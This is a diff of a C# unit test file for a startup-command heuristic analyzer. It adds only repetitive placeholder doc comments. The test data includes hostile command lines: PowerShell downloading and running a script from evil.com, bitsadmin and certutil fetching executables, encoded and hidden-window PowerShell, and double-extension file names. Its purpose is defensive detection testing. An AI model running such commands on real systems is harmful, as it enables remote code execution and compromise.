@@ -4,12 +4,18 @@ using Xunit;
 
 namespace StartupMonitor.Tests.Helpers;
 
+/// <summary>
+/// Provides operations for this member.
+/// </summary>
 public class CliHeuristicAnalyzerTests
 {
     [Theory]
     [InlineData(null, null)]
     [InlineData("", "")]
     [InlineData("   ", "   ")]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_EmptyOrNull_ReturnsNoThreat(string? cmd, string? path)
     {
         var result = CliHeuristicAnalyzer.Analyze(cmd, path);
@@ -23,6 +29,9 @@ public class CliHeuristicAnalyzerTests
     [InlineData("notepad.exe", "C:\\Windows\\System32\\notepad.exe")]
     [InlineData("\"C:\\Program Files\\Git\\bin\\bash.exe\" --login", "C:\\Program Files\\Git\\bin\\bash.exe")]
     [InlineData("explorer.exe", null)]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_LegitimateApps_ReturnsNoThreat(string cmd, string? path)
     {
         var result = CliHeuristicAnalyzer.Analyze(cmd, path);
@@ -34,6 +43,9 @@ public class CliHeuristicAnalyzerTests
     [InlineData("powershell.exe -enc SQBFAFgA")]
     [InlineData("pwsh.exe -encodedcommand SQBFAFgA")]
     [InlineData("powershell -e JABjACAAPQA...")]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_PowerShellBase64_ReturnsHighThreat(string cmd)
     {
         var result = CliHeuristicAnalyzer.Analyze(cmd);
@@ -44,6 +56,9 @@ public class CliHeuristicAnalyzerTests
     }
 
     [Fact]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_InlineBase64_ReturnsHighThreat()
     {
         var cmd = "cmd.exe /c [Convert]::FromBase64String('aGVsbG8=')";
@@ -57,6 +72,9 @@ public class CliHeuristicAnalyzerTests
     [InlineData("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\"")]
     [InlineData("bitsadmin /transfer myJob http://malware.org/x.exe C:\\temp\\x.exe")]
     [InlineData("certutil -urlcache -split -f http://test.com/payload.exe payload.exe")]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_Downloaders_ReturnsHighThreat(string cmd)
     {
         var result = CliHeuristicAnalyzer.Analyze(cmd);
@@ -69,6 +87,9 @@ public class CliHeuristicAnalyzerTests
     [InlineData("invoice.pdf.exe", null)]
     [InlineData("photo.jpg.scr", "C:\\Photos\\photo.jpg.scr")]
     [InlineData("statement.docx.cmd", null)]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_DoubleExtensions_ReturnsHighThreat(string cmd, string? path)
     {
         var result = CliHeuristicAnalyzer.Analyze(cmd, path);
@@ -79,6 +100,9 @@ public class CliHeuristicAnalyzerTests
     }
 
     [Fact]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_HiddenAndBypass_ReturnsHighThreat()
     {
         var cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File script.ps1";
@@ -93,6 +117,9 @@ public class CliHeuristicAnalyzerTests
     [InlineData("C:\\Windows\\Temp\\loader.exe")]
     [InlineData("C:\\Users\\Public\\malware.exe")]
     [InlineData("C:\\PerfLogs\\stealth.exe")]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_SuspiciousLocations_ReturnsMediumThreat(string path)
     {
         var result = CliHeuristicAnalyzer.Analyze(null, path);
@@ -102,6 +129,9 @@ public class CliHeuristicAnalyzerTests
     }
 
     [Fact]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_HiddenOnly_ReturnsMediumThreat()
     {
         var cmd = "wscript.exe //B script.vbs -w hidden";
@@ -112,6 +142,9 @@ public class CliHeuristicAnalyzerTests
     }
 
     [Fact]
+    /// <summary>
+    /// Provides operations for this member.
+    /// </summary>
     public void Analyze_BypassOnly_ReturnsMediumThreat()
     {
         var cmd = "powershell.exe -ExecutionPolicy Bypass -File run.ps1";
